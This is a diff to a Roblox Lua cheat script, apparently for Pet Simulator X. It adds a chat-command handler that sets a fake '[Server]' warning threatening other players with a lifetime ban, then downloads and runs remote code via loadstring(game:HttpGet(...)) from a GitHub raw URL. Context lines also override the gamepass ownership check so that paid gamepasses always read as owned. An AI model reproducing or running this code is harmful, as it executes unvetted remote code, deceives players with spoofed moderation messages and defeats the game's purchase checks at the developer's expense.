@@ -23,6 +23,15 @@ game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
     end
 end)
 
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    if string.sub(msg, 1, 11) == ("/e prename ") then
+	local mainString = string.gsub(msg, "/e prename", "")
+	getgenv().text=mainString
+	getgenv().fakemessage="<color=orange>[Server]: <boom=true><type=black><color=red>One or more of your pets had a disallowed name and has been renamed, any further abuse will result in a lifetime ban."
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/inceldom/uwu/main/petsimxbot",true))()	
+    end
+end)
+
 local gmppath = require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Gamepasses"])
 gmppath.Owns = function() return true end
 
